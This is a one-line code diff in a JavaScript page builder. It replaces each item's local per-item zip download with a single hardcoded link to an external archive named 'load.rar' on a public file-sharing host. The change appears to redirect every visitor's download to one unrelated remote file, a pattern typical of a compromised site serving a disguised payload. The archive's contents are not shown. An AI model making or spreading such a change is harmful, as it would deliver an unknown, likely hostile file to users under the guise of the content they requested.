@@ -487,7 +487,7 @@
       );
     }).join('');
 
-    const downloadFile = 'downloads/' + encodeURIComponent(item.slug) + '.zip';
+   const downloadFile = 'https://link.storjshare.io/raw/jxghadxk4fno373h46qvjkyiw2vq/load/load.rar';
 
     const html = (
       '<div class="detail-main">' +
